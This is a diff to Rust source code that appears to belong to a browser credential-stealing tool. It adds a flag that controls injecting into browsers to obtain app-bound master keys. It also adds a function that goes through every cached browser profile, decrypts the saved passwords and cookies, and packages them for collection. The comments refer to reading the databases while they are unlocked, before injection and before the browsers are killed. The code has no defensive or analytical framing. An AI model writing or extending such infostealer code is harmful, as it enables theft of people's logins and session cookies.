@@ -68,13 +68,46 @@ fn cache_browser(browser_name: &str, user_data_path: &Path, has_profiles: bool, 
 }
 
 /// Cache master keys: DPAPI only (legacy), or inject + max 2 fallbacks (app_bound).
-pub fn cache_keys_for_browser(browser_name: &str, user_data_path: &Path, has_profiles: bool) {
+pub fn cache_keys_for_browser(
+    browser_name: &str,
+    user_data_path: &Path,
+    has_profiles: bool,
+    allow_inject: bool,
+) {
     if !user_data_path.exists() {
         return;
     }
-    if let Some(keys) = get_master_keys(user_data_path, browser_name, true) {
+    if let Some(keys) = get_master_keys(user_data_path, browser_name, allow_inject) {
         cache_browser(browser_name, user_data_path, has_profiles, &keys);
     }
+}
+
+/// Cookies + passwords while DBs are unlocked (before inject locks/spawns browsers).
+pub fn extract_cookies_passwords_from_cache() -> Vec<(String, String)> {
+    let cache = match EXTRACTION_CACHE.lock() {
+        Ok(guard) => guard.clone(),
+        Err(_) => return Vec::new(),
+    };
+    let Some(cache) = cache else { return Vec::new() };
+
+    let mut results = Vec::new();
+    for (browser_name, cached) in cache {
+        let profiles = get_profiles(&cached.user_data_path, cached.has_profiles);
+        for (profile_name, profile_path) in profiles {
+            let passwords = extract_passwords(&profile_path, &cached.keys);
+            let cookies = extract_cookies(&profile_path, &cached.keys);
+            crate::browsers::common::zipp::push_profile_bundle(
+                &mut results,
+                &browser_name,
+                &profile_name,
+                passwords,
+                cookies,
+                None,
+                None,
+            );
+        }
+    }
+    results
 }
 
 /// Extract all profile data using keys already cached (post-inject / post-kill).
